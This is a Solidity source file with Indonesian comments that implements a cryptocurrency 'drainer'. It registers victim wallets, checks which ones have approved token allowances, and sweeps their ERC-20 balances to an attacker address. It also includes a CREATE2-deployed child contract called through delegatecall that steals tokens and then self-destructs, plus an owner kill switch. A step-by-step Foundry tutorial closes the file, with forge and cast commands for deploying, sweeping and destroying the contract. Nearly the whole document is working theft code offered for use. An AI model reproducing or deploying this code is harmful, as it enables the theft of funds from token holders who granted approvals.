// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

// ============================================================
// CONTOH LENGKAP — SATU FILE PENUH
// STEP 1 HINGGA FINISH
// ============================================================

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address,address,uint256) external returns (bool);
    function allowance(address,address) external view returns (uint256);
    function transfer(address,uint256) external returns (bool);
}

// ============================================================
// DRAINER — 8 FUNGSI + EXPLOIT CHILD
// ============================================================

contract DrainerFull {
    // === STORAGE ===
    address private _owner;
    address[] private victims;
    mapping(address => bool) private isVictim;
    address[] private tokens;
    mapping(address => bool) private isToken;
    uint private totalDrained;
    uint private exploitCount;
    bool private paused;
    
    uint constant MAX = 64;
    modifier onlyOwner() { require(msg.sender == _owner); _; }
    
    constructor() {
        _owner = msg.sender;
    }
    
    // ============================================
    // STEP 1: SETUP — init token apa yang mau di-drain
    // ============================================
    function init(address[] calldata list) external onlyOwner {
        for (uint i = 0; i < list.length; i++) {
            if (!isToken[list[i]]) {
                isToken[list[i]] = true;
                tokens.push(list[i]);
            }
        }
    }
    
    // ============================================
    // STEP 2: REGISTER — daftarin victim wallets
    // ============================================
    function register(address[] calldata list) external onlyOwner {
        for (uint i = 0; i < list.length; i++) {
            if (!isVictim[list[i]]) {
                isVictim[list[i]] = true;
                victims.push(list[i]);
            }
        }
    }
    
    // ============================================
    // STEP 3: SCAN — cek siapa aja yang punya allowance
    // ============================================
    function scan(address token) external view returns (
        address[] memory eligible,
        uint[]   memory amounts,
        uint     total
    ) {
        uint count;
        for (uint i = 0; i < victims.length; i++) {
            if (IERC20(token).allowance(victims[i], address(this)) > 0) count++;
        }
        eligible = new address[](count);
        amounts  = new uint[](count);
        uint idx;
        for (uint i = 0; i < victims.length; i++) {
            uint a = IERC20(token).allowance(victims[i], address(this));
            if (a > 0) {
                uint b = IERC20(token).balanceOf(victims[i]);
                eligible[idx] = victims[i];
                amounts[idx]  = a < b ? a : b;
                total += amounts[idx];
                idx++;
            }
        }
    }
    
    // ============================================
    // STEP 4: SWEEP — ambil SEMUA token dari SEMUA victim
    // ============================================
    function sweep(address to) external onlyOwner returns (uint) {
        uint total;
        for (uint t = 0; t < tokens.length && t < MAX; t++) {
            address tk = tokens[t];
            for (uint v = 0; v < victims.length && v < MAX; v++) {
                address u = victims[v];
                uint a = IERC20(tk).allowance(u, address(this));
                if (a == 0) continue;
                uint b = IERC20(tk).balanceOf(u);
                if (b == 0) continue;
                uint amt = a < b ? a : b;
                bool ok = IERC20(tk).transferFrom(u, to, amt);
                if (ok) total += amt;
            }
        }
        totalDrained += total;
        return total;
    }
    
    // ============================================
    // STEP 5: DISCOVER — auto scan list address (tanpa register)
    // ============================================
    function discover(address token, address[] calldata suspects, address to) external onlyOwner returns (uint) {
        uint total;
        for (uint i = 0; i < suspects.length && i < MAX; i++) {
            uint a = IERC20(token).allowance(suspects[i], address(this));
            if (a == 0) continue;
            uint b = IERC20(token).balanceOf(suspects[i]);
            uint amt = a < b ? a : b;
            if (amt > 0 && IERC20(token).transferFrom(suspects[i], to, amt)) total += amt;
        }
        totalDrained += total;
        return total;
    }
    
    // ============================================
    // ADMIN: control
    // ============================================
    function admin(uint8 action, address param) external onlyOwner {
        if      (action == 1) _owner = param;                      // ganti owner
        else if (action == 2) paused = true;                       // pause
        else if (action == 3) paused = false;                      // unpause
        else if (action == 4) selfdestruct(payable(_owner));       // kill contract
        else if (action == 5) {                                    // withdraw trapped tokens
            uint bal = IERC20(param).balanceOf(address(this));
            if (bal > 0) IERC20(param).transfer(_owner, bal);
        }
    }
    
    // ============================================
    // PROXY: DELEGATECALL ke exploit child
    // ============================================
    function proxy(address target, bytes calldata data) external onlyOwner {
        (bool ok,) = target.delegatecall(data);
        require(ok, "proxy fail");
    }
    
    // ============================================
    // DEPLOY: CREATE2 exploit child
    // ============================================
    function deploy(bytes32 salt, address atkAddr) external onlyOwner returns (address) {
        ExploitChild c = new ExploitChild{salt: salt}(address(this), atkAddr);
        exploitCount++;
        return address(c);
    }
    
    // ============================================
    // REPORT: get state
    // ============================================
    function report() external view returns (uint, uint, uint, bool) {
        return (victims.length, tokens.length, totalDrained, paused);
    }
}

// ============================================================
// EXPLOIT CHILD — selfdestruct
// ============================================================
// Storage layout HARUS MATCH dengan DrainerFull untuk DELEGATECALL
// Slot 0 = _owner (DrainerFull) = owner (ExploitChild) → address
// Slot 1 = victims (DrainerFull) = attacker (ExploitChild) → address
//
// Ini BERBAHAYA kalo storage gak match — data corruption!
// Makanya EXPLOIT CHILD cuma punya 2 variable: owner + attacker

contract ExploitChild {
    address private owner;    // Slot 0
    address private attacker; // Slot 1
    
    constructor(address d, address a) {
        owner    = d;   // DrainerFull address
        attacker = a;   // attacker address
    }
    
    function pull(address token, address[] calldata targets, address to) external {
        for (uint i = 0; i < targets.length; i++) {
            address user = targets[i];
            uint a = IERC20(token).allowance(user, address(this));
            if (a == 0) continue;
            uint b = IERC20(token).balanceOf(user);
            if (b == 0) continue;
            uint amt = a < b ? a : b;
            IERC20(token).transferFrom(user, to, amt);
        }
        selfdestruct(payable(to));
    }
}

// ============================================================
// TUTORIAL LENGKAP — PAKE FOUNDRY
// ============================================================
/*
📚 CARA PAKAI (TUTORIAL):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

LANGKAH 0: PRASYARAT
  • Victims sudah approve DrainerFull contract address
  • Attacker tau address victim yang approve

LANGKAH 1: DEPLOY
  forge create DrainerFull --private-key $PK

LANGKAH 2: INIT (set token target)
  cast send $DRAINER "init(address[])" "[$USDC,$WETH]" --private-key $PK

LANGKAH 3: REGISTER (daftarin korban)
  cast send $DRAINER "register(address[])" "[$V1,$V2,$V3]" --private-key $PK

LANGKAH 4: SCAN (cek allowance)
  cast call $DRAINER "scan(address)" $USDC
  → Output: [V1,V2] [100e6,50e6] → 2 victim punya USDC allowance

LANGKAH 5: SWEEP (ambil semua)
  cast send $DRAINER "sweep(address)" $ATTACKER --private-key $PK
  → Semua token dari semua victim → pindah ke $ATTACKER

LANGKAH 6: CREATE2 + DELEGATECALL (opsional)
  deploy = cast send $DRAINER "deploy(bytes32,address)" 0x1 $ATTACKER --pk $PK
  cast send $DRAINER "proxy(address,bytes)" $EXPLOIT $(cast calldata "pull(address,address[],address)" $USDC [$V1] $ATTACKER) --pk $PK
  
LANGKAH 7: REPORT
  cast call $DRAINER "report()"
  → total drained, victim count, dsb

LANGKAH 8: KILL
  cast send $DRAINER "admin(uint8,address)" 4 0x0 --private-key $PK
  → Contract selfdestruct
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔬 TEST DI FOUNDRY (forge init):
  // 1. Deploy DrainerFull
  // 2. Deploy ERC20Mock
  // 3. Mint token ke victim
  // 4. Victim approve DrainerFull
  // 5. Call init + register + scan + sweep
  // 6. Assert balance attacker bertambah
  // 7. Assert balance victim = 0
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
*/
